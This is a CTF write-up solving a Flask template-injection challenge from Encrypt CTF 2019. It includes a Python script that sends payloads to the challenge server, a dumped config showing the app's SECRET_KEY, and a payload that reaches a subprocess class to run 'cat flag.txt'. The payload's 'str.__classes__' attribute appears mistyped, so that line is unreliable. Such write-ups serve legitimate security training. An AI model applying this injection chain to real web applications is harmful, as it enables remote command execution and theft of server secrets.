# web : repeaaaaaat


`Given a Server http://104.154.106.182:5050`
![img](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/repeaaaaaat/img/website.png?raw=true)
`With Source Code`
![img](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/repeaaaaaat/img/source.png?raw=true)
* Source Code contains Base64 encoded hints which change on reloading
> 1. L2xvbF9ub19vbmVfd2lsbF9zZWVfd2hhdHNfaGVyZQ== |> /lol_no_one_will_see_whats_here
> 2. d2hhdF9hcmVfeW91X3NlYXJjaGluZ19mb3IK     	  |> what_are_you_searching_for
> 3. Lz9zZWNyZXQ9ZmxhZw==						  |> /?secret=flag

* 3rd one is really intreresting
![img](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Encrypt-2019/repeaaaaaat/img/inject.png?raw=true)
* Our Code is injected in source , IT is a Flask template injection
### Lets use a script for explioting this bug 
```py
from requests import get
import sys
import html
def Obj(S):
	L = []
	while "<class '" in S:
		s = S.find("<class '")+8
		e = S.find("'>",s)
		# print(S[s])
		L.append(S[s:e])
		S = S[e:]
	return L

A = sys.argv[1]
A = get("http://104.154.106.182:5050/?secret="+A).text
s = A.find("</div>")+6
e = A.find("<!--")
Str = A[s:e]
S = html.unescape(Str)
Check = ''
if len(sys.argv) == 3:
	if sys.argv[2] == '-p':
		print(Obj(S))
print(S)
```
### output
```
$ py exp.py "{{config}}"
 <Config {'ENV': 'production', 'DEBUG': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'cf49d97a5680998cbddbee283eeb03adbeda772b', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```
* we can evaluate our python Input on server
* But we cannot use the functions directly
* Now the Server is Down to Provide the ouput 
### The exploit is :: `str.__classes__.__mro__[1].__subclasses__()[251](['cat','flag.txt'],stdout=-1).communicate()`
`http://127.0.0.1:5000/?secret={{str.__classes__.__mro__[1].__subclasses__()[251](['cat','flag.txt'],stdout=-1).communicate()}}`

# flag is : `encryptCTF{!nj3c7!0n5_4r3_b4D}`